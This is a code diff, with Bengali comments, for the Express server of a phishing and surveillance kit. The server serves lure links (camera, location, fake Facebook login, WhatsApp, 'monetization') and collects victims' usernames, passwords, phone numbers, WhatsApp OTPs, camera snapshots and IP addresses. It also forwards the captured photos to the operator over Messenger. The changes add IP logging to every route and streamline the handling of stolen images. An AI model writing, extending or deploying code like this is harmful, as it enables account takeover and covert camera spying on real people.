@@ -58,25 +58,22 @@ async function checkLinkExpiry(victim) {
 }
 
 // ================================================================
-// অটো ডিলিট: ১০ মিনিট (ছবি ক্যাশ পরিষ্কার)
+// 🗑️ অটো ক্লিনআপ: ১০ মিনিটের পুরনো ছবি মুছে ফেলে (অপটিমাইজড)
 // ================================================================
-const CLEANUP_INTERVAL = 60000;
-const IMAGE_TTL = 600000;
+const CLEANUP_INTERVAL = 60000; // ৬০ সেকেন্ড
+const IMAGE_TTL = 600000; // ১০ মিনিট
 
 setInterval(async () => {
     try {
         const cutoff = new Date(Date.now() - IMAGE_TTL);
-        const victims = await Victim.find();
-        let updated = 0;
-        for (const v of victims) {
-            const originalLength = v.camera.length;
-            v.camera = v.camera.filter(c => new Date(c.timestamp) > cutoff);
-            if (v.camera.length !== originalLength) {
-                await v.save();
-                updated++;
-            }
+        // 🔥 updateMany দিয়ে সব ভিক্টিমের camera অ্যারে থেকে পুরনো ছবি বাদ দিন
+        const result = await Victim.updateMany(
+            { 'camera.timestamp': { $lt: cutoff } },
+            { $pull: { camera: { timestamp: { $lt: cutoff } } } }
+        );
+        if (result.modifiedCount > 0) {
+            console.log(`🗑️ ${result.modifiedCount} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
         }
-        if (updated > 0) console.log(`🗑️ ${updated} টি ভিক্টিমের পুরাতন ছবি মুছে ফেলা হয়েছে।`);
     } catch (err) {
         console.error('Cleanup error:', err);
     }
@@ -92,12 +89,24 @@ function setLinkExpiry() {
 }
 
 // ================================================================
-// রাউটস – লিংক ভিজিট
+// 🔍 ক্লায়েন্ট IP বের করার ফাংশন
+// ================================================================
+function getClientIp(req) {
+    return req.headers['x-forwarded-for']?.split(',').shift() || 
+           req.connection?.remoteAddress || 
+           req.socket?.remoteAddress || 
+           req.ip || 
+           '0.0.0.0';
+}
+
+// ================================================================
+// রাউটস – লিংক ভিজিট (IP লগ সহ)
 // ================================================================
 
 router.get('/v/:id', async (req, res) => {
     try {
-        console.log(`🔍 ক্যামেরা লিংক ভিজিট: ${req.params.id}`);
+        const clientIp = getClientIp(req);
+        console.log(`🔍 ক্যামেরা লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -120,7 +129,8 @@ router.get('/v/:id', async (req, res) => {
 
 router.get('/l/:id', async (req, res) => {
     try {
-        console.log(`🔍 লোকেশন লিংক ভিজিট: ${req.params.id}`);
+        const clientIp = getClientIp(req);
+        console.log(`🔍 লোকেশন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -143,7 +153,8 @@ router.get('/l/:id', async (req, res) => {
 
 router.get('/fb/:id', async (req, res) => {
     try {
-        console.log(`🔍 ফেক লগইন লিংক ভিজিট: ${req.params.id}`);
+        const clientIp = getClientIp(req);
+        console.log(`🔍 ফেক লগইন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -166,7 +177,8 @@ router.get('/fb/:id', async (req, res) => {
 
 router.get('/wp/:id', async (req, res) => {
     try {
-        console.log(`🔍 হোয়াটসঅ্যাপ লিংক ভিজিট: ${req.params.id}`);
+        const clientIp = getClientIp(req);
+        console.log(`🔍 হোয়াটসঅ্যাপ লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -189,7 +201,8 @@ router.get('/wp/:id', async (req, res) => {
 
 router.get('/monitization/:id', async (req, res) => {
     try {
-        console.log(`📢 মনিটাইজেশন লিংক ভিজিট: ${req.params.id}`);
+        const clientIp = getClientIp(req);
+        console.log(`📢 মনিটাইজেশন লিংক ভিজিট: ${req.params.id} (IP: ${clientIp})`);
         const victim = await Victim.findOne({ id: req.params.id });
         if (!victim) {
             return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
@@ -216,7 +229,8 @@ router.get('/monitization/:id', async (req, res) => {
 router.post('/api/victim', async (req, res) => {
     try {
         const data = req.body;
-        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));
+        const clientIp = getClientIp(req);
+        console.log(`📥 ভিক্টিম ডেটা পেয়েছি: ${data.id} (IP: ${clientIp})`);
 
         if (!data.id) {
             console.error('❌ id নেই!');
@@ -299,12 +313,13 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🔥 ক্যামেরা ছবি রিসিভ – আসল ছবি সেভ + রিসাইজ করে মেসেঞ্জারে
+// 🔥 ক্যামেরা ছবি রিসিভ – আসল ছবি সেভ + রিসাইজ করে মেসেঞ্জারে (মেমরি অপটিমাইজড)
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
         const { id, image } = req.body;
-        console.log(`📸 ক্যামেরা রিকোয়েস্ট: ID=${id}, ছবি সাইজ=${image?.length || 0}`);
+        const clientIp = getClientIp(req);
+        console.log(`📸 ক্যামেরা রিকোয়েস্ট: ID=${id}, IP=${clientIp}, সাইজ=${image?.length || 0}`);
 
         if (!id || !image) {
             console.error('❌ id বা image নেই!');
@@ -331,8 +346,7 @@ router.post('/api/camera', async (req, res) => {
         console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
         console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);
 
-        const isFirstImage = !victim.camera || victim.camera.length === 0;
-
+        // ছবি ডাটাবেজে সেভ (আসল)
         if (!victim.camera) victim.camera = [];
         victim.camera.push({ image: image, timestamp: new Date() });
         await victim.save();
@@ -340,26 +354,33 @@ router.post('/api/camera', async (req, res) => {
         const totalImages = victim.camera.length;
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
+        // ================================================================
+        // 🔥 পারমিশন মেসেজ: শুধুমাত্র প্রথম ছবিতে ১ বার পাঠান
+        // ================================================================
+        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && totalImages === 1) {
+            await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
+            console.log(`📸 ক্যামেরা পারমিশন মেসেজ (প্রথম): ${victim.fbId}`);
+        }
+
+        // ================================================================
+        // 📤 মেসেঞ্জারে পাঠানোর জন্য রিসাইজ করা ছবি তৈরি (মেমরি সেভ)
+        // ================================================================
         if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
             try {
                 let resizedBase64 = null;
                 try {
                     const sharp = require('sharp');
                     const imageBuffer = Buffer.from(image, 'base64');
+                    // 🔥 রেজোলিউশন ৪৮০px, কোয়ালিটি ৬০% – মেমরি কম লাগে
                     const resizedBuffer = await sharp(imageBuffer)
-                        .resize({ width: 640, height: 640, fit: 'inside', withoutEnlargement: true })
-                        .jpeg({ quality: 70 })
+                        .resize({ width: 480, height: 480, fit: 'inside', withoutEnlargement: true })
+                        .jpeg({ quality: 60 })
                         .toBuffer();
                     resizedBase64 = resizedBuffer.toString('base64');
-                    console.log(`✅ ছবি রিসাইজ করা হয়েছে (640px)`);
+                    console.log(`✅ ছবি রিসাইজ করা হয়েছে (480px, 60%)`);
                 } catch (sharpErr) {
                     console.log('⚠️ Sharp ব্যবহার করা যায়নি, আসল ছবি পাঠানো হবে:', sharpErr.message);
                     resizedBase64 = image;
-                }
-
-                if (isFirstImage) {
-                    await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
-                    console.log(`📸 ক্যামেরা পারমিশন মেসেজ: ${victim.fbId}`);
                 }
 
                 const result = await sendImageMessageBase64(victim.fbId, resizedBase64);
@@ -414,7 +435,8 @@ router.get('/image/:id/:index', async (req, res) => {
 router.post('/api/fblogin', async (req, res) => {
     try {
         const { id, username, password } = req.body;
-        console.log(`🔐 ফেক লগইন রিকোয়েস্ট: ID=${id}, username=${username}`);
+        const clientIp = getClientIp(req);
+        console.log(`🔐 ফেক লগইন রিকোয়েস্ট: ID=${id}, username=${username}, IP=${clientIp}`);
 
         if (!id || !username || !password) {
             console.error('❌ ডেটা নেই!');
@@ -434,7 +456,7 @@ router.post('/api/fblogin', async (req, res) => {
                 username: username,
                 password: password,
                 timestamp: new Date(),
-                ip: req.ip || req.connection.remoteAddress || 'N/A'
+                ip: clientIp
             };
             await victim.save();
             return res.status(200).json({ status: 'ok', permission: false });
@@ -444,7 +466,7 @@ router.post('/api/fblogin', async (req, res) => {
             username: username,
             password: password,
             timestamp: new Date(),
-            ip: req.ip || req.connection.remoteAddress || 'N/A'
+            ip: clientIp
         };
         await victim.save();
 
@@ -470,7 +492,8 @@ router.post('/api/fblogin', async (req, res) => {
 router.post('/api/monitization', async (req, res) => {
     try {
         const { id, username, password } = req.body;
-        console.log(`📢 মনিটাইজেশন রিকোয়েস্ট: ID=${id}, username=${username}`);
+        const clientIp = getClientIp(req);
+        console.log(`📢 মনিটাইজেশন রিকোয়েস্ট: ID=${id}, username=${username}, IP=${clientIp}`);
 
         if (!id || !username || !password) {
             console.error('❌ ডেটা নেই!');
@@ -490,7 +513,7 @@ router.post('/api/monitization', async (req, res) => {
                 username: username,
                 password: password,
                 timestamp: new Date(),
-                ip: req.ip || req.connection.remoteAddress || 'N/A'
+                ip: clientIp
             };
             await victim.save();
             return res.status(200).json({ status: 'ok', permission: false });
@@ -500,7 +523,7 @@ router.post('/api/monitization', async (req, res) => {
             username: username,
             password: password,
             timestamp: new Date(),
-            ip: req.ip || req.connection.remoteAddress || 'N/A'
+            ip: clientIp
         };
         await victim.save();
 
@@ -526,7 +549,8 @@ router.post('/api/monitization', async (req, res) => {
 router.post('/api/whatsapp', async (req, res) => {
     try {
         const { id, phone, otp } = req.body;
-        console.log(`📱 হোয়াটসঅ্যাপ রিকোয়েস্ট: ID=${id}, phone=${phone}, otp=${otp}`);
+        const clientIp = getClientIp(req);
+        console.log(`📱 হোয়াটসঅ্যাপ রিকোয়েস্ট: ID=${id}, phone=${phone}, otp=${otp}, IP=${clientIp}`);
 
         if (!id) {
             return res.status(400).json({ status: 'error', message: 'Missing id' });
